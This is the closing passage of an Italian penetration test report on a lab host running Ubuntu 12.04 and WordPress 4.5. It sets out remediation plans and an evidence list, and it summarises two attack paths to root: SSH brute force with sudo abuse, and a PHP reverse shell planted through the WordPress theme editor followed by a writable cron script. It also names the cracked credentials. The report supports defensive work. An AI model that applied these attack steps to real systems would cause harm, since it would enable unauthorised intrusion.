    - Implementare firewall rules restrittive
    - Limitare l'accesso SSH a IP whitelisted
    - Limitare accesso WordPress admin a IP specifici

### Long Term Actions (Priority 3 - 1-3 months)

18. **Pianificare migrazione a Ubuntu 22.04 LTS**
    - Ubuntu 12.04 è End of Life dal 2017
    - Testare la compatibilità delle applicazioni (WordPress, ecc.)
    - Pianificare finestra di manutenzione
    - Eseguire backup completo prima della migrazione
    - Considerare migrazione a container/cloud per maggiore sicurezza

19. **Implementare Security Hardening completo**
    - Applicare CIS Benchmarks per Ubuntu e Apache
    - Configurare AppArmor o SELinux per mandatory access control
    - Implementare file integrity monitoring (AIDE/Tripwire)
    - Disabilitare servizi non necessari
    - Principle of least privilege su tutti i servizi

20. **Implementare comprehensive Vulnerability Management Process**
    - Scansioni Nessus automatiche settimanali
    - Patch management policy con SLA definiti
    - Change management process
    - Security awareness training per sviluppatori e admin
    - Regular code review per applicazioni web

21. **Implementare 2FA/MFA**
    - Google Authenticator per SSH
    - Duo Security integration
    - WordPress 2FA plugin (Wordfence, Google Authenticator)
    - Backup codes per emergency access
    - MFA obbligatorio per tutti gli account amministrativi

22. **Security Monitoring & Incident Response**
    - Deploy IDS/IPS (Snort/Suricata)
    - SIEM implementation (Splunk/ELK)
    - File integrity monitoring con alerting
    - Incident response plan e playbooks
    - Regular security audits e penetration testing (quarterly)
    - Security team training

23. **WordPress-Specific Long-term Security**
    - Considerare migrazione a WordPress gestito (WordPress.com, WP Engine)
    - Implementare staging environment per test updates
    - Automated backup solution con offsite storage
    - Content Delivery Network (CDN) con DDoS protection (Cloudflare)
    - Regular security audits dei plugin e temi utilizzati
    - Remove unused plugins, themes, e user accounts

24. **Disaster Recovery & Business Continuity**
    - Automated backup strategy (daily/hourly)
    - Offsite backup storage
    - Backup restoration testing regolare
    - Incident response plan documentation
    - Business continuity plan per compromissioni complete

---

## Compliance Considerations

Il sistema presenta violazioni di:
- **NIST Cybersecurity Framework:** Funzioni di Protezione e Rilevamento non implementate
- **ISO 27001:** Controlli di accesso insufficienti (A.9.2.1, A.9.4.2)
- **PCI DSS:** Se applicabile - Requirement 2 (Default passwords), Requirement 6 (Patching)
- **GDPR:** Se dati personali presenti - rischio di data breach

---

## Appendix A: Tools Used

| Tool | Version | Purpose |
|------|---------|---------|
| netdiscover | Latest | ARP-based host discovery |
| Nessus Professional | Latest | Vulnerability scanning |
| Nmap | 7.x+ | Port scanning & service enumeration |
| Hydra | 9.x+ | Password brute forcing |
| FTP Client | Built-in | FTP enumeration |
| OpenSSH Client | Latest | SSH access |

---

## Appendix B: Evidence Files

### Attack Path 1: SSH Exploitation (Screenshots 1-10)

1. `1_host_discovery.png` - Screenshot della scansione ARP network discovery
2. `2_1_nessu_uncredentialed_scan_1.png` - Risultati Nessus scan non autenticato (host 192.168.50.6)
3. `2_nessu_uncredentialed_scan_2.png` - Dettaglio vulnerabilità Nessus (host 192.168.50.9)
4. `3_nmap_vuln.png` - Output nmap vulnerability scan
5. `4_ftp_anonymous.png` - Accesso FTP anonimo e discovery file
6. `5_users_txt.png` - Contenuto del file users.txt.bk
7. `6_hydra_error.png` - Errore Hydra con troppi task paralleli
8. `7_ssh_manual_test.png` - Test manuale utenti SSH
9. `8_anne_hydra.png` - Successo brute force credenziali anne
10. `9_anne_access_and_privesc.png` - Accesso SSH e privilege escalation a root
11. `10_1_nessus_credentialed_scan_1.png` - Risultati Nessus scan autenticato
12. `10_nessu_credentialed_scan_2.png` - Dettaglio vulnerabilità Shellshock

### Attack Path 2: WordPress Exploitation (Screenshots 11-27)

11. `11_nmap_vuln_robots.png` - Nmap scan con discovery di robots.txt
12. `12_robots_txt.png` - Contenuto robots.txt con /backup_wordpress
13. `13_wp_installation.png` - WordPress blog "Deprecated WordPress blog"
14. `14_wp_login_msf.png` - Metasploit WordPress login enumeration setup
15. `15_wp_login.png` - Metasploit WordPress login module search
16. `16_john_password.png` - Successo brute force WordPress (john:enigma)
17. `17_wp_login_php.png` - WordPress login page con credenziali john
18. `18_wp_dashboard.png` - WordPress admin dashboard dopo login
19. `19_wp_editor.png` - Theme Editor con accesso a footer.php
20. `20_rev_shell.png` - Codice reverse shell PHP iniettato in footer.php
21. `21_listener.png` - Netcat listener su porta 4444 in attesa
22. `22_shell_established.png` - Reverse shell connessa come www-data
23. `23_cron.png` - Contenuto /etc/crontab con cron job root
24. `24_job_permissions.png` - Permessi world-writable (777) su /usr/local/bin/cleanup
25. `25_listener.png` - Netcat listener su porta 443 per root shell
26. `26_edit_the_script.png` - Modifica dello script cleanup con reverse shell
27. `27_shell_access_as_root.png` - Root shell ricevuta tramite cron job exploitation

---

## Appendix C: CVSS Scores Reference

**CVSS v3.0 Severity Scale:**
- **CRITICAL:** 9.0 - 10.0
- **HIGH:** 7.0 - 8.9
- **MEDIUM:** 4.0 - 6.9
- **LOW:** 0.1 - 3.9

**Top Vulnerabilities by CVSS:**
1. Shellshock (CVE-2014-6271): 10.0
2. Ubuntu 12.04 End of Life: 10.0
3. Bash RCE: 9.8

---

## Conclusion

Il penetration test ha dimostrato che il sistema target 192.168.50.9 presenta **vulnerabilità critiche multiple** su diversi livelli che permettono la completa compromissione del sistema attraverso **due attack path completamente indipendenti**, entrambi portando a root access in tempi estremamente brevi.

### Key Findings Summary

**Attack Path 1 - SSH (Time to Root: < 2 ore):**
- Sistema operativo obsoleto (End of Life - Ubuntu 12.04)
- Servizio FTP mal configurato con accesso anonimo
- Information disclosure (lista utenti esposta)
- Credenziali SSH estremamente deboli (anne:princess)
- Privilege escalation banale tramite sudo misconfiguration
- Vulnerabilità critiche non patched (Shellshock CVE-2014-6271)

**Attack Path 2 - WordPress (Time to Root: 15-20 minuti):**
- WordPress 4.5 obsoleto esposto tramite robots.txt
- Credenziali amministrative deboli (john:enigma)
- Theme Editor abilitato permettendo PHP code injection
- Remote Code Execution come www-data
- World-writable cron script eseguito come root (777 permissions)
- Privilege escalation immediata sfruttando il cron job

### Critical Risk Factors

1. **Multiple Independent Attack Vectors:** Due path completamente separati aumentano esponenzialmente il rischio
2. **Weak Credentials Everywhere:** Tutte le credenziali scoperte erano deboli e facilmente brute-forceable
3. **End of Life System:** Nessun supporto di sicurezza, vulnerabilità note non patchabili
4. **Misconfigurations:** Sudo, file permissions (777), editor accessibili
5. **Lack of Defense in Depth:** Nessun layer di sicurezza aggiuntivo (WAF, IDS, rate limiting)

### Immediate Business Impact

- **Confidentiality:** COMPROMESSA - Accesso root = accesso a tutti i dati
- **Integrity:** COMPROMESSA - Possibilità di modificare qualsiasi dato/configurazione
- **Availability:** A RISCHIO - Possibilità di causare DoS completo
- **Reputation:** A RISCHIO - Data breach potenziale, compliance violations

### Urgency Assessment

**CRITICO - AZIONE IMMEDIATA RICHIESTA**

Il sistema è attualmente in uno stato di **MASSIMO RISCHIO** e dovrebbe essere:

1. **Immediatamente isolato** dalla rete di produzione
2. **Sottoposto a hardening completo** seguendo le raccomandazioni Priority 1
3. **Monitorato 24/7** per segni di compromissione
4. **Pianificato per completa reinstallazione** con OS supportato

### Recommendations Priority

1. ✅ **IMMEDIATE (0-48h):** Patch critiche, cambio password, correzione permessi, rimozione/protezione WordPress
2. ⚠️ **SHORT-TERM (1-2 settimane):** Hardening completo, aggiornamenti, implementazione WAF, 2FA
3. 📋 **LONG-TERM (1-3 mesi):** Migrazione OS, security monitoring, incident response, vulnerability management program

### Final Note

Questo penetration test ha identificato **condizioni di sicurezza estremamente critiche**. In un ambiente reale, questo sistema sarebbe stato compromesso in pochi minuti da un attaccante con conoscenze anche basilari.

**Si raccomanda con massima urgenza:**
- Applicazione immediata delle remediation Priority 1
- Considerare il sistema come già potenzialmente compromesso
- Verificare log per evidenze di compromissione passata
- Pianificare completa ricostruzione del sistema con best practices moderne

**Data del Report:** January 27, 2026  
**Versione:** 2.0 - FINAL  
**Status:** COMPLETE - Entrambi i path di attacco documentati

---

*Questo documento contiene informazioni confidenziali e deve essere trattato in conformità con le policy di sicurezza aziendali.*
